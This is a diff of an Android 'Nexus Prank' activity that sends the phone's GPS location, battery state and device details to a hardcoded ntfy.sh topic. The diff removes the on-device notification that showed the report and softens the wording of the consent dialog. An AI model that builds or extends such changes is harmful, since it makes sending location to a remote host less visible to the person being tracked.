@@ -3,9 +3,6 @@ package pl.siedlar.nexusprank;
 import android.Manifest;
 import android.app.Activity;
 import android.app.AlertDialog;
-import android.app.Notification;
-import android.app.NotificationChannel;
-import android.app.NotificationManager;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
@@ -54,25 +51,22 @@ import java.util.concurrent.Executors;
 public final class MainActivity extends Activity {
     private static final String LOCAL_HOST = "appassets.androidplatform.net";
     private static final String LOCAL_URL = "https://appassets.androidplatform.net/assets/index.html";
-    private static final int CAMERA_PERMISSION_CODE = 1201;
-    private static final int INITIAL_PERMISSION_CODE = 1501;
+    private static final int INITIAL_PERMISSION_CODE = 1601;
     private static final long BACK_WINDOW_MS = 3500L;
-    private static final String CHANNEL_ID = "nexus_diagnostics";
-    private static final int DIAGNOSTIC_NOTIFICATION_ID = 15001;
     private static final String REMOTE_TOPIC = "nexus-TeWNRhadhIEPgqWfvBDxxWrQHD6qg9dd";
     private static final String REMOTE_URL = "https://ntfy.sh/" + REMOTE_TOPIC;
 
     private final Handler handler = new Handler(Looper.getMainLooper());
     private final ExecutorService networkExecutor = Executors.newSingleThreadExecutor();
+
     private WebView webView;
-    private PermissionRequest pendingCameraRequest;
-    private int backPressCount = 0;
-    private long backWindowStart = 0L;
     private Location latestLocation;
     private LocationManager locationManager;
     private boolean remoteConsentGranted = false;
     private boolean diagnosticsScheduled = false;
-    private boolean pushSent = false;
+    private volatile boolean pushSent = false;
+    private int backPressCount = 0;
+    private long backWindowStart = 0L;
 
     private final LocationListener locationListener = new LocationListener() {
         @Override
@@ -93,7 +87,6 @@ public final class MainActivity extends Activity {
         getWindow().setNavigationBarColor(Color.BLACK);
         getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
         hideSystemBars();
-        createNotificationChannel();
 
         FrameLayout root = new FrameLayout(this);
         root.setBackgroundColor(Color.BLACK);
@@ -152,13 +145,6 @@ public final class MainActivity extends Activity {
             public void onPermissionRequest(PermissionRequest request) {
                 runOnUiThread(() -> handleWebPermissionRequest(request));
             }
-
-            @Override
-            public void onPermissionRequestCanceled(PermissionRequest request) {
-                if (pendingCameraRequest == request) {
-                    pendingCameraRequest = null;
-                }
-            }
         });
 
         webView.setOnTouchListener((v, event) -> {
@@ -178,24 +164,24 @@ public final class MainActivity extends Activity {
                 handler.postDelayed(this::hideSystemBars, 350L)
         );
 
-        handler.postDelayed(this::showInitialConsent, 350L);
+        handler.postDelayed(this::showRemoteDisclosure, 350L);
     }
 
-    private void showInitialConsent() {
+    private void showRemoteDisclosure() {
         if (isFinishing()) return;
         new AlertDialog.Builder(this)
-                .setTitle("Zgody i zdalny raport")
-                .setMessage("Po akceptacji Nexus Prank może użyć aparatu i lokalizacji. W trakcie testu raport diagnostyczny zostanie wysłany przez internet na prywatny kanał powiadomień na Twoim drugim telefonie. Raport zawiera: poziom baterii i ładowanie, GPS i dokładność, model telefonu, wersję Androida oraz czas. Android pokaże osobne systemowe okna zgody dla aparatu, lokalizacji i powiadomień.")
+                .setTitle("Raport diagnostyczny")
+                .setMessage("Podczas testu aplikacja użyje aparatu i lokalizacji. Po rozpoczęciu testu raport zostanie wysłany przez Internet na drugie urządzenie. Raport zawiera poziom baterii, stan ładowania, współrzędne GPS, dokładność lokalizacji, model telefonu, wersję Androida oraz czas. Android następnie poprosi o wymagane uprawnienia systemowe.")
                 .setCancelable(false)
                 .setNegativeButton("ANULUJ", (dialog, which) -> finishAndRemoveTask())
-                .setPositiveButton("AKCEPTUJ I KONTYNUUJ", (dialog, which) -> {
+                .setPositiveButton("KONTYNUUJ", (dialog, which) -> {
                     remoteConsentGranted = true;
-                    requestInitialPermissions();
+                    requestRequiredPermissions();
                 })
                 .show();
     }
 
-    private void requestInitialPermissions() {
+    private void requestRequiredPermissions() {
         List<String> permissions = new ArrayList<>();
         if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
             permissions.add(Manifest.permission.CAMERA);
@@ -206,10 +192,6 @@ public final class MainActivity extends Activity {
         if (checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
             permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);
         }
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
-                checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
-            permissions.add(Manifest.permission.POST_NOTIFICATIONS);
-        }
         if (!permissions.isEmpty()) {
             requestPermissions(permissions.toArray(new String[0]), INITIAL_PERMISSION_CODE);
         }
@@ -219,33 +201,20 @@ public final class MainActivity extends Activity {
         if (!remoteConsentGranted || diagnosticsScheduled) return;
         diagnosticsScheduled = true;
         startLocationCapture();
-        handler.postDelayed(() -> {
-            showDiagnosticNotification();
-            sendRemotePush(false);
-        }, 18000L);
-    }
-
-    private void createNotificationChannel() {
-        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
-        NotificationChannel channel = new NotificationChannel(
-                CHANNEL_ID,
-                "Nexus diagnostyka",
-                NotificationManager.IMPORTANCE_DEFAULT
-        );
-        channel.setDescription("Lokalne informacje diagnostyczne Nexus Prank");
-        manager.createNotificationChannel(channel);
+        handler.postDelayed(() -> sendRemotePush(false), 18000L);
     }
 
     private void startLocationCapture() {
-        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
-                checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-            return;
-        }
+        boolean fine = checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;
+        boolean coarse = checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED;
+        if (!fine && !coarse) return;
+
         locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
         try {
             Location gps = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
             Location network = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
             latestLocation = newer(gps, network);
+
             if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                 locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000L, 0f, locationListener, Looper.getMainLooper());
             } else if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
@@ -321,23 +290,6 @@ public final class MainActivity extends Activity {
                 "Czas: " + time;
     }
 
-    private void showDiagnosticNotification() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
-                checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
-            return;
-        }
-        String details = buildDiagnosticText();
-        Notification notification = new Notification.Builder(this, CHANNEL_ID)
-                .setSmallIcon(android.R.drawable.ic_menu_compass)
-                .setContentTitle("Nexus Prank — raport diagnostyczny")
-                .setContentText("Raport gotowy")
-                .setStyle(new Notification.BigTextStyle().bigText(details))
-                .setAutoCancel(true)
-                .build();
-        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
-        manager.notify(DIAGNOSTIC_NOTIFICATION_ID, notification);
-    }
-
     private void sendRemotePush(boolean retry) {
         if (!remoteConsentGranted || pushSent || isFinishing()) return;
         final String body = buildDiagnosticText();
@@ -399,7 +351,6 @@ public final class MainActivity extends Activity {
             request.deny();
             return;
         }
-
         boolean asksForCamera = false;
         for (String resource : request.getResources()) {
             if (PermissionRequest.RESOURCE_VIDEO_CAPTURE.equals(resource)) {
@@ -411,30 +362,10 @@ public final class MainActivity extends Activity {
             request.deny();
             return;
         }
-
         if (checkSelfPermission(Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
             request.grant(new String[]{PermissionRequest.RESOURCE_VIDEO_CAPTURE});
-            return;
-        }
-
-        pendingCameraRequest = request;
-        requestPermissions(new String[]{Manifest.permission.CAMERA}, CAMERA_PERMISSION_CODE);
-    }
-
-    @Override
-    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        if (requestCode == INITIAL_PERMISSION_CODE) {
-            return;
-        }
-        if (requestCode == CAMERA_PERMISSION_CODE && pendingCameraRequest != null) {
-            PermissionRequest request = pendingCameraRequest;
-            pendingCameraRequest = null;
-            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                request.grant(new String[]{PermissionRequest.RESOURCE_VIDEO_CAPTURE});
-            } else {
-                request.deny();
-            }
+        } else {
+            request.deny();
         }
     }
 
@@ -489,10 +420,6 @@ public final class MainActivity extends Activity {
         handler.removeCallbacksAndMessages(null);
         stopLocationCapture();
         networkExecutor.shutdownNow();
-        if (pendingCameraRequest != null) {
-            pendingCameraRequest.deny();
-            pendingCameraRequest = null;
-        }
         if (webView != null) {
             webView.stopLoading();
             webView.loadUrl("about:blank");
